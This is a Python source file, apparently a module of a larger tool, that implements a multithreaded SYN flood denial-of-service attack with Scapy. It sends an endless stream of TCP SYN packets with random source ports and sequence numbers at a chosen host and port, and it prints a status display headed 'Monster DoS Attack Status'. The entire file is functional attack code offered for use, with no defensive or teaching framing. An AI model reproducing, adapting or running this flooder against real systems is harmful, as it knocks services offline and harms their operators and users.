###########
# IMPORTS #
###########
from scapy.all import IP, TCP, conf, raw
import random
import threading
import time
import sys

############
# PRE-DEFS #
############
conf.verb = 0

############
# COUNTERS #
############
lock = threading.Lock()
start_time = 0
total_sent = 0
total_errors = 0
running = True

##################
# CONFIGURATIONS #
##################
NUM_THREADS = 12

###########################
# WORKER (send thread)    #
###########################
def worker(host, port, base_pkt):
    global total_sent, total_errors

    try:
        sock = conf.L3socket()
    except Exception as e:
        with lock:
            total_errors += 1
        print(f"[!] Failed to open L3socket: {e}")
        print("[!] Check: 1) Npcap installed  2) running as Administrator")
        return

    while running:
        try:
            pkt = base_pkt.copy()
            pkt[TCP].sport = random.randint(1024, 65535)
            pkt[TCP].seq = random.randint(0, 2**32 - 1)
            sock.send(pkt)
            with lock:
                total_sent += 1
        except Exception as e:
            with lock:
                total_errors += 1
                n = total_errors
            if n == 1:
                print(f"[!] Send error: {e}")
            time.sleep(0.1)

    try:
        sock.close()
    except Exception:
        pass

###########
# DISPLAY #
###########
def update_display(host, port):
    global running
    CLEAR = "\033[2J\033[H"

    while running:
        elapsed = time.time() - start_time
        with lock:
            sent = total_sent
            err = total_errors
        pps = int(sent / elapsed) if elapsed > 0 else 0

        print(CLEAR, end="")
        print("=" * 50)
        print("\033[0;35m  Monster DoS Attack Status (SYN Flood / Scapy persistent)")
        print("=" * 50)
        print(f"  Host:Port     : {host}:{port}")
        print(f"  Uptime (s)    : {int(elapsed)}")
        print(f"  Threads       : {NUM_THREADS}")
        print(f"  Packets sent  : {sent}")
        print(f"  PPS (approx)  : {pps}")
        if err:
            print(f"  Errors        : {err}")
        print("=" * 50)
        print("\033[31m  [Press Ctrl+C to stop]")
        time.sleep(1)

#######################
# MAIN CODE OF ATTACK #
#######################
def main_attack(host, port):
    global start_time, running

    start_time = time.time()
    running = True

    base_pkt = IP(dst=host) / TCP(dport=port, flags="S")

    display_thread = threading.Thread(
        target=update_display, args=(host, port), daemon=True
    )
    display_thread.start()

    workers = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(
            target=worker, args=(host, port, base_pkt), daemon=True
        )
        t.start()
        workers.append(t)

    try:
        while running:
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Stopping...")
        running = False
        for t in workers:
            t.join(timeout=1)
        sys.exit(0)

##########
# RUNNER #
##########
def run(host, port, type):
    print(f"[DEBUG] run() called for {host}:{port} (type: {type})")
    try:
        main_attack(host, port)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(0)
